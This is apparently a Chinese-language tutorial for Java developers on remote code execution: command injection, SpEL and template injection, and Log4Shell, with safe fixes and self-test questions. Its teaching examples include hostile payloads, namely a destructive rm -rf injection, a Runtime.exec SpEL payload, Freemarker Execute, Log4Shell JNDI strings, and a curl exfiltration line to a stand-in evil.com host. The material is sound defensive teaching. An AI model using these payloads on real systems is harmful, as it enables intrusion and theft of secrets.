## 为什么要学

RCE（Remote Code Execution，远程代码执行）是漏洞金字塔的塔尖：前面学的 SQL 注入、SSRF、文件上传，很多时候是**通向 RCE 的路**，而 RCE 本身意味着攻击者能在你的服务器上执行任意命令——落 WebShell、读所有配置、横向进内网、拿云凭证，一步到位。

Java 世界的 RCE 有它自己的“口味”，和 PHP/Python 不完全一样。它主要来自四类：一是 `Runtime.exec` / `ProcessBuilder` 拼接外部命令（命令注入）；二是表达式注入，尤其是 Spring 生态无处不在的 **SpEL**（Spring Expression Language），以及历史上 Struts2 的 OGNL；三是模板注入（SSTI，Thymeleaf/Freemarker）；四是反序列化（这块单独放在 [[web-deser]] 讲）。此外还有轰动一时的 **Log4Shell（CVE-2021-44228）**，它把“记一条日志”变成了远程代码执行。

对你这个 Java 后端来说，这些都不是纸上谈兵：你一定调用过外部命令（ffmpeg 转码、生成二维码、调用系统工具处理 IoT 上报的文件）、一定用过 Spring 的 `@Value("#{...}")` 或用表达式做过动态规则、大概率用过 Thymeleaf 渲染页面、几乎肯定用过 Log4j2 打日志。每一处都可能是入口。

学完这一课你应该能：说清 `Runtime.exec(String)` 和 `ProcessBuilder(List)` 为什么一个危险一个安全；能区分并正确使用 SpEL 的 `StandardEvaluationContext` 与 `SimpleEvaluationContext`；识别模板注入；并从原理上讲清楚 Log4Shell 为什么影响面那么大、它和 SSRF、反序列化是怎么串起来的。

## 核心概念

### 1. Runtime.exec(String) vs ProcessBuilder(List)：shell 解析的差异

最常见的命令注入根源，是把用户输入拼进一个**字符串命令**，再交给 shell 解释。危险写法：

```java
// 危险：filename 来自用户，比如 "x.jpg; rm -rf / #"
String cmd = "ffmpeg -i " + filename + " out.mp4";
Runtime.getRuntime().exec(cmd);           // 一种重载会按空格拆分
Runtime.getRuntime().exec(new String[]{"sh", "-c", cmd});  // 更糟：显式交给 shell
```

这里的关键，不在 `Runtime` vs `ProcessBuilder` 这两个类本身，而在 **“命令有没有经过 shell 解析”**。

- 一旦你把命令交给 `sh -c "..."`，shell 就会解释 `;` `|` `&&` `$()` `` ` `` `>` 等元字符。用户输入里的 `; rm -rf /` 就成了第二条独立命令。这是命令注入的本质。
- `Runtime.exec(String)` 的“单字符串”重载只按空白拆分成数组，**不经过 shell**，所以 `;`、`|` 不会被当元字符——但它对带空格的参数、引号处理很弱，容易出别的 bug，实践中不推荐依赖它做安全边界。

安全写法：**用 `ProcessBuilder(List)`（或 `exec(String[])`）把命令和每个参数分开传，不拼字符串、不过 shell**：

```java
// 安全：程序名和每个参数是数组里独立的元素，filename 只会被当成"一个参数"
ProcessBuilder pb = new ProcessBuilder("ffmpeg", "-i", filename, "out.mp4");
pb.redirectErrorStream(true);
Process p = pb.start();   // 直接 execve，没有 shell，filename 里的 ; | $() 都是普通字符
```

因为 `ProcessBuilder` 直接用底层 `execve` 启动进程，参数数组原样传给目标程序，中间没有 shell 来解释元字符——`filename` 哪怕是 `"a.jpg; rm -rf /"`，也只是被 ffmpeg 当成一个（不存在的）文件名报错，绝不会执行 `rm`。

一张图记住区别：

```
Runtime.exec("sh -c 'ls "+f+"'")  -->  shell parses ; | $()  -->  command injection   注入生效，危险
ProcessBuilder("ls", f)           -->  execve directly     -->  f is one argument    注入失效，安全
```

补充几条铁律：

- 参数分离能挡住“注入新命令”，但挡不住“参数本身被滥用”。比如 `tar`、`find -exec`、`ffmpeg` 有些参数能读写任意文件或执行命令，用户即使不能加 `;` 也可能通过参数搞事。所以仍要**校验参数取值**（白名单、正则），必要时禁止以 `-` 开头的用户输入被当选项。
- 能不调外部命令就别调。转码、压缩、图片处理优先用 Java 库或独立服务，从源头消灭命令注入面。
- 若无论如何要过 shell，对参数做严格白名单（如只允许 `[A-Za-z0-9_.-]`），绝不做“黑名单过滤危险字符”——元字符太多，永远漏。

### 2. SpEL 注入：StandardEvaluationContext vs SimpleEvaluationContext

SpEL 是 Spring 的表达式语言，`@Value("#{...}")`、`@PreAuthorize`、Spring Data、Spring Integration 里到处是它。它的能力非常强——**强到能调用任意 Java 方法、访问任意类**，这也正是它危险的原因。如果用户输入被当成 SpEL 表达式来求值，就等于 RCE：

```java
// 危险：把用户输入当表达式求值
ExpressionParser parser = new SpelExpressionParser();
String userInput = "T(java.lang.Runtime).getRuntime().exec('calc')";
Object result = parser.parseExpression(userInput).getValue();  // 弹计算器 = RCE
```

`T(...)` 是 SpEL 的类型引用语法，能拿到任意类的静态方法；于是 `T(java.lang.Runtime).getRuntime().exec(...)` 就执行了系统命令。

关键在于**用哪种 EvaluationContext 求值**。SpEL 提供两种，能力天差地别：

| | StandardEvaluationContext | SimpleEvaluationContext |
|---|---|---|
| 类型引用 `T(...)` | 允许 | 禁止 |
| 调用任意方法/构造器 | 允许 | 仅受限（默认只读属性/索引等） |
| Bean 引用 `@bean` | 允许 | 禁止 |
| 适用场景 | 完全可信的表达式（你自己写死的） | 求值含不可信输入的表达式 |

`SpelExpressionParser` 不显式传 context 时，`getValue()` 内部用的是 **`StandardEvaluationContext`（全功能）**——这正是上面那段代码能 RCE 的原因。处理任何可能含用户输入的表达式，必须显式改用 `SimpleEvaluationContext`：

```java
// 安全：SimpleEvaluationContext 关掉了 T() 类型引用、任意方法调用、bean 引用
EvaluationContext ctx = SimpleEvaluationContext.forReadOnlyDataBinding().build();
ExpressionParser parser = new SpelExpressionParser();
Object result = parser.parseExpression(userInput).getValue(ctx);
// userInput = "T(java.lang.Runtime)..." 时会抛异常/求值失败，而不是执行命令
```

`SimpleEvaluationContext.forReadOnlyDataBinding()` 构建的上下文只能做属性读取、集合/数组索引、字面量运算这类“数据绑定”操作，`T(...)`、任意方法调用、`@bean` 引用全部不可用。

铁律：**最好根本不要把用户输入当表达式求值**。如果业务确实需要（如让运营配置动态规则），才用 `SimpleEvaluationContext`，并对可用变量做白名单。历史上 Struts2 的一系列 RCE（OGNL 表达式注入）、以及某些 Spring 组件的 CVE，根子都在“不可信数据流进了全功能表达式求值”。

### 3. 模板注入（SSTI）：Thymeleaf / Freemarker

SSTI（Server-Side Template Injection，服务端模板注入）：当**用户输入被拼进模板字符串**、再交给模板引擎渲染时，用户就能注入模板语法，进而调用 Java 代码。

危险的根源是“用输入决定模板内容”，而不是“用输入填模板变量”。对比：

```java
// 安全：user 是数据，模板名"profile"是写死的，${user.name} 只是取值
model.addAttribute("user", user);   // 渲染固定模板 templates/profile.html

// 危险：把用户输入当成了模板名或模板片段
return "redirect:" + userInput;                 // 可能触发表达式解析
// 或用 SpringTemplateEngine 直接 process 一段含用户输入的字符串模板
```

Thymeleaf 里最典型的坑是**表达式片段被当成模板路径**：某些 Controller 返回值（视图名）里若混入 `__${...}__` 这类预处理表达式，Thymeleaf 会先对它求值（底层就是 SpEL），于是又回到了第 2 节的 SpEL RCE。Freemarker 的危险点则是内置指令，如 `<#assign x="freemarker.template.utility.Execute"?new()>${x("id")}`，能直接执行命令。

防御要点：

- **永远不要用用户输入拼模板内容或模板名**。模板是代码，不是数据；数据只应通过 model 变量传入固定模板。
- 视图名、重定向地址不要直接用用户输入拼接；需要跳转就用白名单映射。
- Freemarker 可通过配置限制不安全的内置方法；但根本解法仍是“输入不进模板结构”。

### 4. Log4Shell（CVE-2021-44228）：一条日志变成 RCE

Log4Shell 是 2021 年底 Apache Log4j2 的漏洞，影响面之大堪称现象级。它的可怕之处在于：**触发条件仅仅是“把一段攻击者可控的字符串写进了日志”**。

问题出在 Log4j2 的一个特性——**消息里的 lookup（变量替换）**。当 Log4j2 记录一条消息时，它会解析消息里 `${...}` 形式的占位符并做替换，其中包括 `${jndi:...}`，会触发一次 **JNDI 查找**。

攻击链（概念上）是这样的：

```
1. attacker sends header:  User-Agent: ${jndi:ldap://evil.com/a}   攻击者把它塞进任意会被记录的字段
2. app logs it:            log.info("UA={}", userAgent);            开发者只是打了条日志
3. Log4j2 sees ${jndi:...} -> JNDI lookup -> LDAP query to evil.com  这一步就是 SSRF：服务器主动外连
4. evil LDAP returns a reference to a remote Java class              指向 http://evil.com/Exploit.class
5. vulnerable versions fetch + load + instantiate that class        下载并实例化 -> 执行攻击者的代码
```

把它拆开看，就理解了它和别的漏洞的联系：

- **和 SSRF 的联系**：第 3 步，服务器被诱导向攻击者的 LDAP/RDAP/DNS 服务器发起请求——这就是一次 SSRF，还常被用来做带外数据外传（把 `${env:AWS_SECRET_...}` 拼进 JNDI URL 里发出去）。
- **和反序列化/远程类加载的联系**：第 4、5 步，JNDI 允许从远程加载并实例化 Java 对象（历史上 JNDI 注入正是反序列化/远程类加载利用的经典载体，[[web-deser]] 会展开）。旧版 JDK 默认允许远程 codebase 加载，才让这条链走通。

**为什么影响面那么大？** 三个原因叠加：

- Log4j2 是 Java 生态最主流的日志库，几乎无处不在，且常作为其他库的传递依赖被间接引入——很多人根本不知道自己用了它。
- 触发点是“记日志”，而任何 HTTP 头、参数、用户名、UA 都可能被某处代码记进日志，攻击面无边界、无需认证、可远程触发。
- 利用极其简单：发一个带 `${jndi:ldap://...}` 的字符串即可，无需复杂前置条件。

**修复与缓解（概念层面）**：升级到官方修复后的 Log4j2 版本是根本解法（后续版本移除/默认关闭了消息 lookup 与 JNDI 的危险行为）；临时缓解包括移除 JndiLookup 类、限制 JVM 的远程 codebase 加载等。具体版本号与参数请以 Apache 官方公告和 [CISA：Apache Log4j Vulnerability Guidance](https://www.cisa.gov/news-events/news/apache-log4j-vulnerability-guidance) 为准，我不在此凭记忆写死版本号。

> 顺带一提 Spring4Shell（另一个 2022 年的 Spring RCE）：它走的是数据绑定 + 类属性操纵的路子，和 Log4Shell 机理不同，这里只作提及，细节以官方公告为准。

## 动手实践

> 攻击载荷只能打你自己的实验环境或已获授权的目标，切勿用于他人系统。

Lab 07（命令注入 + SpEL 注入攻防）在 `docs/labs/README.md` 里还是待做状态（计划 2027.02）。这一节用两段可自行运行的最小实验，加一个 PortSwigger 靶场。

### 实践一：亲眼看 shell 解析的差异

写一个小 main 方法对比两种调用（在你自己机器上，建议把 `rm -rf` 换成无害的 `touch /tmp/pwned` 来验证）：

```java
String f = "a.txt; touch /tmp/pwned";       // 模拟恶意"文件名"
// A) 过 shell：注入生效
new ProcessBuilder("sh", "-c", "ls " + f).inheritIO().start().waitFor();
// B) 参数分离：注入失效
new ProcessBuilder("ls", f).inheritIO().start().waitFor();
```

怎么读：运行 A 之后 `ls /tmp/pwned` 存在——`;` 被 shell 当成了命令分隔符，`touch` 被执行了，这就是命令注入。运行 B（先删掉 /tmp/pwned 再跑）后 `/tmp/pwned` 不会出现，`ls` 只会报错说找不到名为 `a.txt; touch /tmp/pwned` 的文件——因为没有 shell，整个字符串被当成一个参数。这一正一反，就是本课第 1 节的全部要点。

### 实践二：SpEL 两种 Context 对照

```java
ExpressionParser parser = new SpelExpressionParser();
String payload = "T(java.lang.Runtime).getRuntime().exec(new String[]{\"id\"})";
// A) 默认（StandardEvaluationContext）：能执行，危险
System.out.println(parser.parseExpression(payload).getValue());
// B) SimpleEvaluationContext：抛异常，安全
EvaluationContext ctx = SimpleEvaluationContext.forReadOnlyDataBinding().build();
System.out.println(parser.parseExpression(payload).getValue(ctx));
```

怎么读：A 会真的启动一个 `id` 进程（返回一个 Process 对象），证明默认上下文允许 `T(...)` 和任意方法调用；B 会抛出类似 “Type cannot be found” / “method not allowed” 的异常，因为 `SimpleEvaluationContext` 禁掉了类型引用和任意方法调用。结论：凡是可能含用户输入的表达式，必须显式传 `SimpleEvaluationContext`。

### 实践三：PortSwigger OS command injection

做 Apprentice 级 “OS command injection, simple case”：在某个查询库存的功能里，把参数改成 `& whoami &` 或 `; whoami`，响应里就回显了命令执行结果。怎么读：这演示了服务端把用户输入拼进了 shell 命令——和实践一的 A 分支完全同源。修法也一样：改成参数分离的 `ProcessBuilder(List)`，或干脆不调外部命令。

## 攻击者视角

RCE 通常不是第一步，而是攻击链的“收网”。典型路径：

```
entry vuln        -> escalates to RCE
file upload       -> drop a WebShell into an executable dir     见 web-upload
command injection -> ; | $() spliced into a shell command
SpEL / OGNL       -> T(java.lang.Runtime).exec(...)
template (SSTI)   -> Freemarker Execute / Thymeleaf preprocess
deserialization   -> gadget chain -> exec / remote class load   见 web-deser
Log4Shell         -> ${jndi:ldap://...} in one log line
```

- **探测**：命令注入常用“时间盲注”确认——注入 `; sleep 5`，响应明显变慢就说明命令被执行了（响应不回显时尤其有用）。SpEL 探测则用 `${7*7}` / `#{7*7}` 看是否被求值成 49。
- **带外**：拿不到回显就把结果外传——`curl http://evil.com/$(whoami)`、Log4Shell 里 `${jndi:ldap://evil.com/${env:SECRET}}`，用攻击者自己的服务器接收。
- **拿到执行能力后**：读配置密钥、下载内网工具、反弹 shell、在云上偷 IMDS 凭证（回到 [[web-ssrf]]）横向移动。RCE 往往意味着这台机器彻底失守。

## 防御与最佳实践

- **命令执行**：优先用库/独立服务替代外部命令;必须调用时用 `ProcessBuilder(List)`/`exec(String[])` 参数分离、不过 shell;仍要对参数做白名单校验，禁止用户输入被当选项（`-`/`--` 开头）。
- **表达式**：不要把用户输入当表达式求值;确需动态表达式时用 `SimpleEvaluationContext.forReadOnlyDataBinding()`,并对可用变量白名单。警惕 `@Value("#{}")`、`@PreAuthorize`、Spring Data 里流入的不可信数据。
- **模板**：模板名/模板内容一律写死,用户输入只作 model 变量;视图名与重定向地址用白名单,不拼接用户输入。
- **依赖与日志**：用 SCA/依赖扫描（如 OWASP Dependency-Check）盯住 Log4j2、Fastjson、Struts2 这类高危组件并及时升级;不要把大段不可信输入原样打进日志。
- **纵深防御**：应用以最小权限运行(非 root、只读文件系统、容器 `noNewPrivileges`);出网收敛(参考 SSRF 的出网代理/NetworkPolicy),即使 RCE 得手也难外连和横移;WAF 可挡掉一部分已知 payload,但不能替代修复。

## 常见误区

- **“我过滤了 `;` 和 `|` 就防住命令注入了。”** shell 元字符太多（`&` `&&` `$()` `` ` `` 换行 `>` 等），黑名单永远漏。正解是参数分离不过 shell。
- **“用了 ProcessBuilder 就绝对安全。”** 若你仍传 `sh -c "..."` 一样注入；且参数本身可能被滥用（危险的程序选项）。安全来自“不过 shell + 参数校验”，不是类名。
- **“SpEL 只是取个值，能有多危险？”** 默认的 `StandardEvaluationContext` 能 `T(Runtime).exec()`，等于 RCE。含用户输入必须换 `SimpleEvaluationContext`。
- **“模板注入不就是 XSS？”** XSS 在浏览器里执行 JS，SSTI 在服务器上执行 Java 代码，后者是 RCE，危害高一个量级。
- **“Log4Shell 是 Log4j 的 bug，我不直接用就没事。”** 它常作为传递依赖被间接引入；且同类“字符串被解析执行”的风险不止 Log4j。要靠依赖扫描而非记忆。
- **“内网服务不会被 RCE 打到。”** Log4Shell 证明了只要有一条日志、一个可控字段就能触发，内网、无认证的服务反而更危险。

## 自测

:::details 1. Runtime.exec(String) 和 ProcessBuilder(List) 的安全差异到底在哪？
差异不在类，而在“命令是否经过 shell 解析”。真正危险的是把拼接好的字符串交给 `sh -c "..."`：shell 会解释 `;` `|` `&&` `$()` `` ` `` 等元字符，用户输入里的 `; rm -rf /` 就成了第二条命令。`ProcessBuilder(List)`（或 `exec(String[])`）把程序名和每个参数作为数组元素分开传，底层直接 `execve` 启动进程，中间没有 shell，用户输入只会被当成“一个参数”，元字符失去意义。所以安全来自“参数分离、不过 shell”，而不是用了哪个类——若你用 ProcessBuilder 却传 `sh -c` 一样会被注入。
:::

:::details 2. 什么时候必须用 SimpleEvaluationContext 而不是 StandardEvaluationContext？
只要被求值的 SpEL 表达式里含有（哪怕间接含有）不可信输入，就必须用 `SimpleEvaluationContext`。`StandardEvaluationContext`（也是 `getValue()` 不传 context 时的默认）功能全开：支持 `T(...)` 类型引用、任意方法/构造器调用、`@bean` 引用，因此 `T(java.lang.Runtime).getRuntime().exec(...)` 能直接 RCE。`SimpleEvaluationContext.forReadOnlyDataBinding()` 只允许属性读取、索引、字面量运算，禁掉了类型引用和任意方法调用。更好的做法是根本不让用户输入进入表达式求值。
:::

:::details 3. 什么是 SSTI？它和 XSS、SpEL 注入什么关系？
SSTI 是服务端模板注入：用户输入被拼进模板的结构（模板内容或模板名）而非仅作数据变量，于是能注入模板语法调用服务端代码。它和 XSS 的区别是执行位置——XSS 在浏览器执行 JS，SSTI 在服务器执行 Java，属于 RCE。它和 SpEL 的关系是：Thymeleaf 的表达式底层就是 SpEL，某些预处理表达式被求值时会走到 SpEL，于是 SSTI 常常最终收敛成一次 SpEL RCE。防御共性：输入只当数据，绝不进入“代码/结构”的位置。
:::

:::details 4. Log4Shell 为什么影响面那么大？它和 SSRF、反序列化有什么联系？
三点叠加：Log4j2 是最主流的日志库、常作为传递依赖被间接引入（很多人不知道自己在用）；触发点是“记一条日志”，任何被记录的 HTTP 头/参数/UA 都可能命中，攻击面无边界、无需认证、可远程触发；利用极简，发一个 `${jndi:ldap://...}` 字符串即可。它和 SSRF 的联系：处理该字符串时服务器会主动向攻击者的 LDAP/DNS 发请求，这本身就是一次 SSRF（也用于带外外传密钥）。和反序列化的联系：JNDI 查找会从远程加载并实例化 Java 对象，历史上 JNDI 注入正是远程类加载/反序列化利用的经典载体，旧版 JDK 默认允许远程 codebase 加载才让整条链走通。
:::

:::details 5. “我过滤了危险字符”为什么不是防命令注入的正确方式？
因为 shell 元字符太多，除了 `;` `|` 还有 `&` `&&` `||` `$()` `` `...` `` `>` `<` 换行符等，黑名单几乎不可能列全，总会被新写法绕过；不同 shell 行为还不一致。正确做法是从机制上消除 shell 解析：用 `ProcessBuilder(List)` 参数分离，让用户输入永远只是“一个参数”；在此基础上再对参数取值做白名单校验（如只允许字母数字和有限符号），并防止用户输入被当成程序选项。
:::

:::details 6. 拿到 RCE 之前，攻击者常借助哪些入口漏洞？
文件上传（传 WebShell 到可执行目录）、命令注入（shell 拼接）、SpEL/OGNL 表达式注入、模板注入 SSTI、反序列化（gadget chain）、以及 Log4Shell 这类“字符串被解析执行”的组件漏洞。它们的共性是“不可信数据流到了会被执行的位置”。所以防 RCE 的功夫大多在上游：SQL 注入、SSRF、文件上传这些看似“较轻”的漏洞，往往正是通向 RCE 的第一跳。
:::

## 一句话总结

Java 的 RCE 主要来自命令拼接、表达式注入（SpEL）、模板注入和反序列化：命令执行要用 `ProcessBuilder(List)` 参数分离而非过 shell，SpEL 处理不可信输入必须用 `SimpleEvaluationContext`，模板名/内容绝不能来自用户输入，而 Log4Shell 则用“一条日志 → JNDI 查找 → 远程类加载”把 SSRF 与远程类加载串成了一次无需认证的远程代码执行。
